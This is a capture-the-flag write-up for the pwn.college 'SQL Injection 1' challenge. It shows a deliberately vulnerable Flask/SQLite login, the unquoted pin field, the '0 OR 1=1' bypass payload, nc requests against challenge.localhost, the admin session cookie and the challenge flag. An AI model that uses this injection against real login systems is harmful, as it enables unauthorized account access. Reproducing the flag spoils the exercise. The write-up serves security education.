---
layout: page
title: "💉 SQL Injection 1 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

The challenge involves a Flask web application with a vulnerable login mechanism using SQLite. The objective is to log in as the `admin` user and retrieve the flag.

---

## 🧬 Source Code

```python
#!/opt/pwn.college/python

import random
import flask
import os
import sqlite3
import tempfile

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()

# Setup database
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as pin""", [random.randrange(2**32, 2**63)])
db.execute("""INSERT INTO users SELECT "guest" as username, 1337 as pin""")

@app.route("/session", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("identity")
    pin = flask.request.form.get("pin")
    if not username:
        flask.abort(400, "Missing `identity` form parameter")
    if not pin:
        flask.abort(400, "Missing `pin` form parameter")

    if pin[0] not in "0123456789":
        flask.abort(400, "Invalid pin")

    try:
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = {pin}"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or pin")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)

@app.route("/session", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=identity>Pin:<input type=text name=pin><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

---

## Vulnerability

The application builds the SQL query like this:
```bash
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = {pin}"
```
Because the pin is injected without quotes, it allows SQL injection via numeric expressions — as long as the first character is a digit (pin[0] in "0123456789").

---

## Exploit
You can bypass the PIN check using:
```
0 OR 1=1
```

### Step 1: Login as admin using SQL injection
```bash
printf "POST /session HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:28\r\n\r\nidentity=admin&pin=0 OR 1=1\n\n" | nc challenge.localhost 80
```
This results in:
```
Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aHyxbQ.AhClMqE0W8T4xNTPQab1OJHP3Uk
```

### Step 2: Use the session cookie to access the flag
```bash
printf "GET /session HTTP/1.0\r\nHost:challenge.localhost\r\nCookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aHyxbQ.AhClMqE0W8T4xNTPQab1OJHP3Uk\r\n\r\n" | nc challenge.localhost 80
```

---
## Flag
```
Hello, admin!<br>Here is your flag: pwn.college{M8aIvvd56Vhp4kc6EDr1GrmcDBS.QXzcTN2wSM0IzMyEzW}
```

Flag: pwn.college{M8aIvvd56Vhp4kc6EDr1GrmcDBS.QXzcTN2wSM0IzMyEzW}

---
